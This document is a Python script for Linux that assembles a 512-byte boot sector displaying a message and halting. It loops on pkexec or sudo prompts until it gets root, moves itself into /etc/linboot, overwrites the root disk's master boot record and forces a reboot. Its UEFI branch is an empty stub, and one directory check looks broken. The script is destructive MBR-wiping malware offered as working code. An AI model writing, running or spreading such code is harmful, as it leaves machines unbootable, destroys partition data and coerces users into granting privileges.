MSG = 'C++/python'


import os
from shutil import move as _move
from subprocess import run as sp_run
from sys import exit as _exit, platform, executable


if platform != 'linux':
    print(f'DO NOT SUPPORT ({platform})')
    _exit(1)


PATH = '/etc/linboot'
FILE_LINBOOT = os.path.join(PATH, os.path.split(__file__)[-1])
FILE_MBR = os.path.join(PATH, 'mbr.bin')

PROC_MOUNTS = '/proc/mounts'
SYS_DISK = '/sys/block'

REBOOT = '/usr/sbin/reboot'
SUDO = '/usr/bin/pkexec' if os.environ.get('DISPLAY', False) else '/usr/bin/sudo'
EFIBOOTMGR = '/usr/bin/efibootmgr'

IS_UEFI = os.path.exists('/sys/firmware/efi')
IS_ROOT = os.getuid() == 0


def cmd(c, ret=False):
    try:
        return getattr(
            sp_run(c, capture_output=True, text=True), 
            'returncode' if ret else 'stdout'
        )
    except:
        return None


def get_root():
    while cmd([SUDO, executable, __file__], ret=True) != 0: ...
    _exit(0)


def make_mbr():
    '''
BITS 16
ORG 0x7C00


start:
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00
    sti
    mov si, msg


output:
    lodsb
    cmp al, 0
    je loop
    mov ah, 0x0E
    mov bh, 0x00
    int 0x10
    jmp output


loop:
    cli
    hlt


msg db 'here is (MSG)', 0
dw 0xAA55
    '''

    template = b'\xfa1\xc0\x8e\xd8\x8e\xc0\x8e\xd0\xbc\x00|\xfb\xbe\x1f|\xac<\x00t\x08\xb4\x0e\xb7\x00\xcd\x10\xeb\xf3\xfa\xf4'
    
    template_len = len(template)
    msg_len = len(MSG)
    
    mbr = bytearray(512)
    mbr[0:template_len] = template
    mbr[template_len:template_len + msg_len] = MSG
    mbr[template_len + msg_len] = 0
    mbr[510] = 0x55
    mbr[511] = 0xAA

    return mbr


def disk_bios():
    if not (os.path.isdir(PROC_MOUNTS) or os.path.isdir(SYS_DISK)):
        _exit(-1)
    
    with open(PROC_MOUNTS, 'r') as f:
        for line in f:
            n = line.split()

            if (len(n) < 2) or not n[0].startswith('/dev/') or (n[1] != '/'):
                continue

            root_disk = n[0]
            break
        else:
            _exit(-1)
   
    for n in os.listdir(SYS_DISK):
        if n not in root_disk:
            continue

        name = f'/dev/{n}'

        try:
            with open(name, 'rb') as f:
                sector = f.read(512)

                if sector[510:512] == b'\x55\xaa':
                    return name
        except:
            break

    _exit(-1)


def bios():
    mbr = make_mbr()
    disk = disk_bios()

    try:
        with open(disk, 'wb') as f:  
            f.write(mbr)                    
            f.flush()                       
            os.fsync(f.fileno())            
        os.sync()  
    except:
        _exit(1)

    sp_run([REBOOT])


def make_efi():
    '''
    
    '''


def uefi():
    ...


def main():
    global MSG

    if not isinstance(MSG, str):
        raise TypeError('(MSG) must be str')
    
    try:
        encoding = 'UTF-16LE' if IS_UEFI else 'ASCII' 
        MSG = MSG.encode(encoding)
    except UnicodeEncodeError:
        raise ValueError(f'(MSG) must be {encoding}')

    if len(MSG) > 478:
        raise OverflowError('(MSG) length > 478')
    
    not IS_ROOT and get_root()

    if not os.path.isdir(PATH):
        os.mkdir(PATH)

    _move(__file__, FILE_LINBOOT)
    
    (uefi if IS_UEFI else bios)()
    _exit(0)


if __name__ == '__main__': main()